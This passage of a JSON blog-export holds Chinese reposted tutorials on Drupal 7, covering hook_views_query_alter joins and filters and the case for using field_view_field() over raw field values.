overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[表字段]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">,\r\n [和字段进行比较的&#20540;], </code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[操作符]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">);</code></div>\r\n</div>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</div>\r\n</div>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n<br style=\"margin:0px; padding:0px\">\r\n说明：&nbsp;<br style=\"margin:0px; padding:0px\">\r\n&nbsp; &nbsp; &nbsp; &nbsp; 1.表名：对query增加一个数据库中的表<br style=\"margin:0px; padding:0px\">\r\n&nbsp; &nbsp; &nbsp; &nbsp; 2.表字段：存在query中的所有字段都可以使用<br style=\"margin:0px; padding:0px\">\r\n&nbsp; &nbsp; &nbsp; &nbsp; 3.和字段进行比较的&#20540;：要和表字段进行比较的&#20540;，这里根据业务需求来赋&#20540;<br style=\"margin:0px; padding:0px\">\r\n&nbsp; &nbsp; &nbsp; &nbsp; 4.操作符：执行where条件用的操作符，比如like = &lt; &gt; in之类不再累述。<br style=\"margin:0px; padding:0px\">\r\n2.使用关联数据表进行内容过滤</p>\r\n<div style=\"margin:0px; padding:0px; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2000007629395px\">\r\n<div id=\"highlighter_367698\" class=\"syntaxhighlighter  php\" style=\"margin:1em 0px!important; padding:10px 0px; width:682.625px; position:relative!important; overflow:auto!important; font-size:1em!important; background-color:rgb(15,25,42)!important\">\r\n<div class=\"toolbar\" style=\"margin:0px!important; padding:0px!important; border:none!important; bottom:auto!important; float:none!important; height:11px!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:absolute!important; right:1px!important; top:1px!important; vertical-align:baseline!important; width:11px!important; font-family:Consolas,'Bitstream Vera Sans Mono','Courier New',Courier,monospace!important; font-size:10px!important; min-height:inherit!important; z-index:10!important; color:rgb(209,237,255)!important; background:rgb(67,90,95)!important\">\r\n<span style=\"margin:0px; padding:0px\"><a target=\"_blank\" href=\"http://drupalchina.cn/node/5469#\" class=\"toolbar_item command_help help\" style=\"color:rgb(9,157,93); margin:0px!important; padding:1px 0px 0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; text-align:center!important; top:auto!important; vertical-align:baseline!important; width:auto!important; font-size:14px!important; min-height:inherit!important; text-decoration:none!important; display:block!important; background:none!important\">?</a></span></div>\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; width:908px; margin:0px!important; padding:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; font-family:Consolas,'Bitstream Vera Sans Mono','Courier New',Courier,monospace!important; font-size:14px!important; min-height:inherit!important; background:none!important\">\r\n<tbody style=\"margin:0px!important; padding:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; background:none!important\">\r\n<tr style=\"margin:0px!important; padding:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; background:none!important\">\r\n<td class=\"gutter\" style=\"padding:5px 8px; border:1px solid rgb(211,231,244); margin:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; font-family:Consolas,'Bitstream Vera Sans Mono','Courier New',Courier,monospace!important; font-size:14px!important; min-height:inherit!important; color:rgb(175,175,175)!important; background:none!important\">\r\n<div class=\"line number1 index0 alt2\" style=\"margin:0px!important; padding:0px 0.5em 0px 1em!important; border-width:0px 3px 0px 0px!important; border-right-style:solid!important; border-right-color:rgb(67,90,95)!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; text-align:right!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n1</div>\r\n<div class=\"line number2 index1 alt1\" style=\"margin:0px!important; padding:0px 0.5em 0px 1em!important; border-width:0px 3px 0px 0px!important; border-right-style:solid!important; border-right-color:rgb(67,90,95)!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; text-align:right!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n2</div>\r\n<div class=\"line number3 index2 alt2\" style=\"margin:0px!important; padding:0px 0.5em 0px 1em!important; border-width:0px 3px 0px 0px!important; border-right-style:solid!important; border-right-color:rgb(67,90,95)!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; text-align:right!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n3</div>\r\n<div class=\"line number4 index3 alt1\" style=\"margin:0px!important; padding:0px 0.5em 0px 1em!important; border-width:0px 3px 0px 0px!important; border-right-style:solid!important; border-right-color:rgb(67,90,95)!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; text-align:right!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n4</div>\r\n</td>\r\n<td class=\"code\" style=\"padding:5px 8px; border:1px solid rgb(211,231,244); width:876px; margin:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; font-family:Consolas,'Bitstream Vera Sans Mono','Courier New',Courier,monospace!important; font-size:14px!important; min-height:inherit!important; background:none!important\">\r\n<div class=\"container\" style=\"margin:0px!important; padding:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:relative!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; background:none!important\">\r\n<div class=\"line number1 index0 alt2\" style=\"margin:0px!important; padding:0px 1em!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n<code class=\"php variable\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(255,170,62)!important; background:none!important\">$join</code>\r\n<code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">\r\n= </code><code class=\"php keyword\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(180,61,61)!important; background:none!important\">new</code>\r\n<code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">\r\nviews_join;</code></div>\r\n<div class=\"line number2 index1 alt1\" style=\"margin:0px!important; padding:0px 1em!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n<code class=\"php variable\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(255,170,62)!important; background:none!important\">$join</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">-&gt;construct(</code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[添加关联的数据表]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">,\r\n</code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[被关联的数据表]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">,\r\n</code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[被关联的数据表的字段&#20540;]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">,\r\n</code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[添加关联的数据表的字段&#20540;]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">);</code></div>\r\n<div class=\"line number3 index2 alt2\" style=\"margin:0px!important; padding:0px 1em!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n<code class=\"php variable\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(255,170,62)!important; background:none!important\">$query</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">-&gt;add_relationship(</code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[添加关联的数据表]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">,\r\n</code><code class=\"php variable\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(255,170,62)!important; background:none!important\">$join</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">,\r\n</code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[被关联的数据表]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">);</code></div>\r\n<div class=\"line number4 index3 alt1\" style=\"margin:0px!important; padding:0px 1em!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n<code class=\"php variable\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(255,170,62)!important; background:none!important\">$query</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">-&gt;add_where(0,\r\n</code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[表字段]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">,\r\n [和字段进行比较的&#20540;], </code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[操作符]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">);</code></div>\r\n</div>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</div>\r\n</div>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n说明： &nbsp; &nbsp; &nbsp; &nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n1.实例化join &nbsp; &nbsp; &nbsp; &nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n2.设置它的construct。进行表和表之间的关联，和left join类&#20284; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n（将view中已存在的数据表和新添加的进行关联） &nbsp; &nbsp; &nbsp; &nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n3.调用$query的add_relationship方法，将它关联到$query中。 &nbsp; &nbsp; &nbsp; &nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n4.和1中的add_where用法一致，不再说</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n以上就是我使用到的hook_views_query_alter。如果有什么专业术语的问题，欢迎纠正错误，如果还有一些其他用法也希望大家可以一起交流交流。</p>\r\n",
			"tags":"view filter,hook_views_query_alt,drupal7",
			"id":"46439279",
			"categories":"drupal-7",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年04月11日 16:48:49",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"转载自http://drupalchina.cn/node/5369 \r\n原作者： phpartisan\r\n\r\n\r\n\r\n\r\nDrupal7中导入了Entity概念！并且提供了强大的相关字段的存储，加载，编辑，渲染的field API。通过内容类型的字段管理以及显示管理的标签页可以用覆盖其所有处理环节。\r\n\r\n但是在Entity一连串的相关处理之外，有时经常需要针对某个特定的字段进行另外的渲染处理。",
			"title":"Drupal 7中的字段渲染方法",
			"type":"repost",
			"content":"\r\n<p>转载自http://drupalchina.cn/node/5369&nbsp;</p>\r\n<p>原作者：<span style=\"color:rgb(137,137,137); font-family:Verdana,sans-serif; line-height:25px\">&nbsp;</span><a target=\"_blank\" href=\"http://drupalchina.cn/users/phpartisan\" title=\"查看用户资料\" class=\"username\" style=\"margin:0px; padding:0px; color:rgb(209,158,42); font-family:Verdana,sans-serif; line-height:25px\">phpartisan</a></p>\r\n<p><br>\r\n</p>\r\n<p></p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\nDrupal7中导入了Entity概念！并且提供了强大的相关字段的存储，加载，编辑，渲染的field API。通过内容类型的字段管理以及显示管理的标签页可以用覆盖其所有处理环节。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n但是在Entity一连串的相关处理之外，有时经常需要针对某个特定的字段进行另外的渲染处理。比如说我们想把node的作者名放置到边栏。当然也可以使用Panels和CCK Blocks等模块实现此类需求。也可以通过简单的代码实现。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n&nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n有没有碰到过这样的写法。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n//此为不太好的写法。</p>\r\n<pre class=\"php;\" style=\"margin-top:15px; margin-bottom:20px; padding:10px 15px; border-color:rgb(204,204,204); border-style:solid; border-width:1px 1px 1px 5px; white-space:pre-wrap; color:rgb(76,81,84); font-size:14px; line-height:25.2000007629395px; background:rgb(244,245,247)\">$block['content'] = $node-&gt;field_name['und'][0]['safe_value'];</pre>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n&nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n在drupal6中为了获取想显示的&#20540;直接使用node对象是非常常见的一种方法。「 'safe_value' 」是已经检测过的&#20540;应该是安全的。但是不觉得有什么问题吗？可以列举以下几个理由。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n1.首先「 'und' 」是drupal7中对字段的语言设置（详细可参考<a target=\"_blank\" href=\"http://hojtsy.hu/blog/2011-jan-31/drupal-7039s-new-multilingual-systems-part-4-node-translation\" rel=\"nofollow\" class=\"ext\" target=\"_blank\" style=\"margin:0px; padding:0px; color:rgb(9,157,93); text-decoration:none\">Gabor\r\n Hojtsy的博客<span class=\"ext\" style=\"margin:0px; padding:0px 12px 0px 0px; width:10px; height:10px\"><span class=\"element-invisible\" style=\"margin:0px; padding:0px; overflow:hidden; height:1px; position:absolute!important\">(link is external)</span></span></a>）。直接通过它指定&#20540;时，没有考虑到多语言环境下出现的问题。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n2，如果不想失去模板引擎所提供的正常的字段渲染优势，不应该直接指定使用字段的&#20540;。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n3.[0]['safe_value']是明确指定了字段的第一个&#20540;。如果这样的话，当字段存在多个&#20540;时会需要循环处理。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n4.一些字段（例如node reference)并不存在「 'safe_value' 」元素。此情况下如果使用未检验过的「 'value' 」时并不安全。并不是说node reference字段含有不安全的&#20540;（此类型仅仅是node ID），而是说对于初级开发人员会养成一种非良好的习惯。也许其他字段的「 'value' 」中会含有不安全的&#20540;。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n&nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n幸好field_view_field()提供了解决方案。</p>\r\n<pre class=\"php;\" style=\"margin-top:15px; margin-bottom:20px; padding:10px 15px; border-color:rgb(204,204,204); border-style:solid; border-width:1px 1px 1px 5px; white-space:pre-wrap; color:rgb(76,81,84); font-size:14px; line-height:25.2000007629395px; background:rgb(244,245,247)\">$output = field_view_field('node', $node, 'field_name');</pre>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n&nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n此函数的返回&#20540;具备了已经正确检验（＃4已通过），含有要素全体（＃3已通过），正确的语言配置（＃1已通过），含有正确的markup（＃2已通过）的渲染数组！字段中如果没有使用中语言的正确有效&#20540;时会自动切换为网站默认语言。而且此函数的参数可以传递含有&#26684;式的设置以及View Mode设置信息的数组。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; 